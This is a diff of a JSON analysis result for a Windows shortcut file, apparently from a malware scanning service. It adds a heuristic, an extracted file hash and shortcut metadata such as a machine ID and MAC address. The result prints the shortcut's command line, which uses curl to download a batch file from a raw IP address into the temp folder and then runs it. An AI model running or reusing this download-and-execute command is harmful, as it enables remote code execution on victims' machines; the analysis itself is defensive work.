@@ -3,11 +3,14 @@
         "supplementary": [
             "7bc83dc886c8b19c6bf4078f843b54f6afbf32be4563746021afcc6d84950b9b"
         ],
-        "extracted": []
+        "extracted": [
+            "45ba09884a955f6e7715cea6153320b869bd8cd2e6fa4340f663d36d4353f2e9"
+        ]
     },
     "result": {
         "heuristics": [
-            1
+            1,
+            5
         ],
         "tags": {
             "file.date.creation": [
@@ -16,11 +19,17 @@
             "file.date.last_modified": [
                 "2021:09:18 17:06:26+00:00"
             ],
-            "file.name.extracted": [
-                "cmd.exe"
+            "file.shortcut.machine_id": [
+                "desktop-gutn2mb"
+            ],
+            "file.shortcut.tracker_mac": [
+                "B2:FC:36:F3:3F:15"
             ],
             "file.shortcut.command_line": [
                 "..\\..\\..\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
             ]
         }
     }
